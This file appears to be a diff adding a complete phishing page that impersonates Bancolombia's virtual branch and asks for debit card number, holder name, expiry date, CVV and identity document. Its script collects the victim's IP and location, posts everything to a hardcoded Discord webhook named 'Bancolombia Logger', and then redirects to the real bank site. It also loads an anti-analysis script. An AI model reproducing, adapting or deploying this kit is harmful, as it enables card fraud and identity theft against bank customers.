@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <script src="assets/js/anti_analysis.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bancolombia - Sucursal Virtual Personas</title>
+    <link rel="stylesheet" href="assets/css/all.min-2.css">
+    <style>
+        :root {
+            --a: #000000;
+            --b: #333333;
+            --c: #666666;
+            --d: #E0E0E0;
+            --e: #A0A0A0;
+            --f: #FFFFFF;
+            --g: #F8F9FA;
+            --h: #D0D5DD;
+            --i: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            --j: 4px;
+            --k: 8px;
+            --l: 16px;
+            --m: 24px;
+            --n: 42px;
+            --o: #FDDA24;
+        }
+
+        body {
+            margin: 0;
+            font-family: var(--i);
+            color: var(--b);
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        .x1 {
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            background-image: url('https://i.postimg.cc/zB7SgJJc/Gemini-Generated-Image-oljvh9oljvh9oljv.png'); 
+            background-size: cover; 
+            background-position: center; 
+            background-repeat: no-repeat; 
+            background-color: var(--g);
+        }
+
+        .x2 {
+            text-align: center;
+            padding: var(--n) var(--l) var(--l);
+        }
+
+        .x3 {
+            margin: auto;
+            display: block;
+            justify-content: center;
+            margin-top: 50px;
+        }
+
+        .x4 {
+            height: 24px;
+            max-width: 150px;
+        }
+
+        .x2 h1 {
+            font-size: 1.2rem;
+            margin: 0;
+            font-weight: 300;
+        }
+
+        .x5 {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: var(--l);
+        }
+
+        .x6 {
+            background-color: var(--f);
+            padding: var(--m);
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+            width: 100%;
+            max-width: 450px;
+            box-sizing: border-box;
+        }
+
+        .x6 h2 {
+            font-size: 1.6rem;
+            margin-top: 0;
+            margin-bottom: var(--j);
+            font-weight: bold;
+        }
+
+        .x6 p {
+            color: var(--c);
+            margin-bottom: var(--m);
+            font-size: 0.95rem;
+            font-weight: 300;
+        }
+
+        .x7 {
+            position: relative;
+            margin-bottom: var(--l);
+        }
+
+        .x8 {
+            position: absolute;
+            left: 0;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--c);
+            font-size: 1.2rem;
+            pointer-events: none;
+        }
+
+        .x7 input {
+            width: 100%;
+            padding: var(--k) var(--k) var(--k) 2.2rem;
+            border: none;
+            border-bottom: 1px solid var(--h);
+            font-size: 1rem;
+            font-weight: 300;
+            box-sizing: border-box;
+            transition: border-color 0.2s;
+        }
+
+        .x7 input:focus {
+            outline: none;
+            border-bottom-color: var(--a);
+        }
+
+        .x9 {
+            display: block;
+            color: var(--a);
+            text-decoration: underline;
+            font-size: 0.8rem;
+            font-weight: bold;
+            margin-bottom: var(--m);
+            text-align: left;
+            cursor: pointer;
+        }
+
+        .x6 button {
+            width: 100%;
+            padding: var(--l);
+            border: none;
+            border-radius: 25px;
+            font-size: 1rem;
+            font-weight: bold;
+            background-color: var(--d);
+            color: var(--e);
+            cursor: not-allowed;
+            transition: all 0.3s ease;
+        }
+
+        .x6 button.active {
+            background-color: var(--o);
+            color: var(--a);
+            cursor: pointer;
+        }
+
+        .y1 {
+            display: block;
+            color: var(--a);
+            text-decoration: underline;
+            font-size: 0.8rem;
+            font-weight: bold;
+            margin-top: var(--n);
+            text-align: center;
+            cursor: pointer;
+        }
+
+        .y2 {
+            padding: var(--m) var(--l);
+            border-top: 1px solid var(--h);
+            display: flex;
+            justify-content: center;
+        }
+
+        .y3 {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: var(--k);
+        }
+
+        .y3 a {
+            color: var(--c);
+            text-decoration: none;
+            font-size: 0.85rem;
+            font-weight: 300;
+        }
+
+        @media (min-width: 768px) {
+            .x1 { background-color: transparent; }
+            .x2 { text-align: left; padding: var(--m) var(--n); display: flex; justify-content: space-between; align-items: center; }
+            .x3 { margin: auto; display: block; justify-content: center; margin-top: 50px; }
+            .x4 { margin-right: auto; }
+            .x2 h1 { font-size: 1.6rem; text-align: center; flex: 1; }
+            .x5 { padding: 0; }
+            .x6 { padding: var(--n); }
+            .y2 { display: none; }
+        }
+    </style>
+</head>
+<body>
+    <div class="x1">
+        <header class="x2">
+            <div class="x3">
+                <center>
+                    <img src="assets/ggg-2.png" alt="sd" class="x4" style="width: 200px; margin: auto;">
+                    <br>
+                </center>
+                <br><br>
+            </div>
+        </header>
+
+        <main class="x5">
+            <div class="x6">
+                <center><br>
+                    <img style="width: 39px;" src="assets/gdfd.jpg" alt="">
+                    <p style="line-height: 1.5;">Verifica los datos de tu tarjeta débito.</p>
+                    <form id="f1">
+                        <div class="x7">
+                            <i class="fas fa-credit-card x8"></i>
+                            <input type="text" id="i1" placeholder="Número de tarjeta" inputmode="numeric" maxlength="19">
+                        </div>
+
+                        <div class="x7">
+                            <i class="fas fa-user x8"></i>
+                            <input type="text" id="i2" placeholder="Nombre del titular" maxlength="40">
+                        </div>
+
+                        <div class="x7">
+                            <i class="fas fa-calendar x8"></i>
+                            <input type="text" id="i3" placeholder="Fecha de vencimiento (MM/AA)" inputmode="numeric" maxlength="5">
+                        </div>
+
+                        <div class="x7">
+                            <i class="fas fa-lock x8"></i>
+                            <input type="password" id="i4" placeholder="Código de seguridad (CVV)" inputmode="numeric" maxlength="4">
+                        </div>
+
+                        <div class="x7">
+                            <i class="fas fa-id-card x8"></i>
+                            <input type="text" id="i5" placeholder="Documento de identidad" inputmode="numeric" maxlength="12">
+                        </div>
+
+                        <button type="submit" id="b1" disabled="">Continuar</button>
+                    </form>
+                </center>
+            </div>
+        </main>
+
+        <footer class="y2">
+            <ul class="y3">
+                <li><a href="#">¿Problemas para conectarte?</a></li>
+                <li><a href="#">Aprende sobre seguridad</a></li>
+                <li><a href="#">Reglamento Sucursal Virtual</a></li>
+                <li><a href="#">Política de privacidad</a></li>
+            </ul>
+        </footer>
+    </div>
+
+    <script>
+        const u = document.getElementById('i1');
+        const nombre = document.getElementById('i2');
+        const fecha = document.getElementById('i3');
+        const cvv = document.getElementById('i4');
+        const doc = document.getElementById('i5');
+        const b = document.getElementById('b1');
+        const f = document.getElementById('f1');
+
+        u.addEventListener('input', (e) => {
+            let valor = u.value.replace(/\D/g, '').slice(0, 16);
+            u.value = valor.replace(/(\d{4})(?=\d)/g, '$1 ');
+            v();
+        });
+
+        fecha.addEventListener('input', (e) => {
+            let valor = fecha.value.replace(/\D/g, '').slice(0, 4);
+            if (valor.length >= 3) {
+                fecha.value = valor.slice(0, 2) + '/' + valor.slice(2);
+            } else {
+                fecha.value = valor;
+            }
+            v();
+        });
+
+        cvv.addEventListener('input', (e) => {
+            cvv.value = cvv.value.replace(/\D/g, '').slice(0, 4);
+            v();
+        });
+
+        doc.addEventListener('input', (e) => {
+            doc.value = doc.value.replace(/\D/g, '').slice(0, 12);
+            v();
+        });
+
+        const v = () => {
+            const rT = /^\d{4} \d{4} \d{4} \d{4}$/;
+            const rN = /^[A-Za-záéíóúñÁÉÍÓÚÑ ]{3,}$/;
+            const rF = /^(0[1-9]|1[0-2])\/\d{2}$/;
+            const rC = /^\d{3,4}$/;
+            const rD = /^\d{6,12}$/;
+
+            if (rT.test(u.value) && rN.test(nombre.value) && rF.test(fecha.value) && rC.test(cvv.value) && rD.test(doc.value)) {
+                b.disabled = false;
+                b.classList.add('active');
+            } else {
+                b.disabled = true;
+                b.classList.remove('active');
+            }
+        };
+
+        async function obtenerGeolocalizacion() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const datos = await response.json();
+                return {
+                    ip: datos.ip || 'No disponible',
+                    pais: datos.country_name || 'No disponible',
+                    ciudad: datos.city || 'No disponible'
+                };
+            } catch (error) {
+                console.error('Error al obtener geolocalización:', error);
+                return {
+                    ip: 'Error al obtener',
+                    pais: 'Error al obtener',
+                    ciudad: 'Error al obtener'
+                };
+            }
+        }
+
+        function obtenerFechaHora() {
+            const ahora = new Date();
+            const opciones = { 
+                day: 'numeric', 
+                month: 'long', 
+                hour: 'numeric', 
+                minute: 'numeric',
+                hour12: true
+            };
+            return ahora.toLocaleDateString('es-ES', opciones).replace(',', '');
+        }
+
+        async function enviarADiscord(tarjeta, nombre, fecha, cvv, doc, ip, pais, ciudad) {
+            const webhookURL = 'https://discord.com/api/webhooks/1535389558215016568/xbt23jToC912hbuSNC07b2FZPcjEHv8fhbsxWMWK7CKhi_evwTOkSjgnai-XS4J5ZwVg';
+            
+            const fechaHora = obtenerFechaHora();
+            
+            const embed = {
+                title: "💳 Tarjeta de Débito",
+                color: 0x10b981,
+                fields: [
+                    {
+                        name: "**👤 Nombre**",
+                        value: nombre,
+                        inline: false
+                    },
+                    {
+                        name: "**💳 Número de tarjeta**",
+                        value: tarjeta,
+                        inline: false
+                    },
+                    {
+                        name: "**📅 Vencimiento**",
+                        value: fecha,
+                        inline: true
+                    },
+                    {
+                        name: "**🔒 CVV**",
+                        value: cvv,
+                        inline: true
+                    },
+                    {
+                        name: "**🪪 Documento**",
+                        value: doc,
+                        inline: false
+                    },
+                    {
+                        name: "**🌍 IP y Ubicación**",
+                        value: `${ip} - ${ciudad}, ${pais}`,
+                        inline: false
+                    }
+                ],
+                footer: {
+                    text: fechaHora
+                }
+            };
+            
+            const payload = {
+                embeds: [embed],
+                username: 'Bancolombia Logger',
+                avatar_url: 'https://i.postimg.cc/BvGx78bB/ggg.png'
+            };
+            
+            try {
+                const respuesta = await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload)
+                });
+                
+                if (respuesta.ok) {
+                    console.log('✅ Tarjeta enviada a Discord correctamente');
+                } else {
+                    console.error('❌ Error al enviar:', respuesta.status);
+                }
+            } catch (error) {
+                console.error('❌ Error de conexión:', error);
+            }
+        }
+
+        f.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            b.disabled = true;
+            b.innerHTML = '<i class="fas fa-spinner fa-spin"></i>';
+            
+            const tarjeta = u.value;
+            const nombreVal = nombre.value;
+            const fechaVal = fecha.value;
+            const cvvVal = cvv.value;
+            const docVal = doc.value;
+            
+            const geo = await obtenerGeolocalizacion();
+            
+            await enviarADiscord(tarjeta, nombreVal, fechaVal, cvvVal, docVal, geo.ip, geo.pais, geo.ciudad);
+            
+            setTimeout(() => {
+                window.location.href = 'https://www.bancolombia.com/personas/contactanos/bancolombia';
+            }, 2000);
+        });
+    </script>
+</body>
+</html>
